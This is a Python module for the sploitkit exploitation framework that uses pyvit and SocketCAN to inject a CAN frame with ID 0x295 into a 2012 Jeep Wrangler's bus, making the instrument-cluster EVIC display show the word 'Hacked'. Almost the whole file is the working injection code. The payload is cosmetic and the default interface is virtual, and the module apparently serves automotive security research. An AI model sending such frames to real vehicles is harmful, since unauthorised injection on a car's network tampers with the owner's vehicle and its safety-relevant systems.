from sploitkit import *
from pyvit import can
from pyvit.hw import socketcan

class jeep_wrangler_evicsend(Module):
    """ This module allows you to display the word Hacked on a 2012 Jeep Wrangler EVIC.

    Author:  shipcod3
    Credits: Chad Gibbon (original analysis)
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    }) 
    
    def run(self):
        dev = socketcan.SocketCanDev(self.config.option('INTERFACE').value)

        dev.start()
        print("[*] Sending EVIC with some love...")
        frame = can.Frame(0x295)
        frame.data = [0x48,0x61,0x63,0x6b,0x65,0x64,0x0A]
        print("[+] Check the message at the EVIC or the interactive display system in the middle of the instrument cluster.")
        dev.send(frame)
        pass
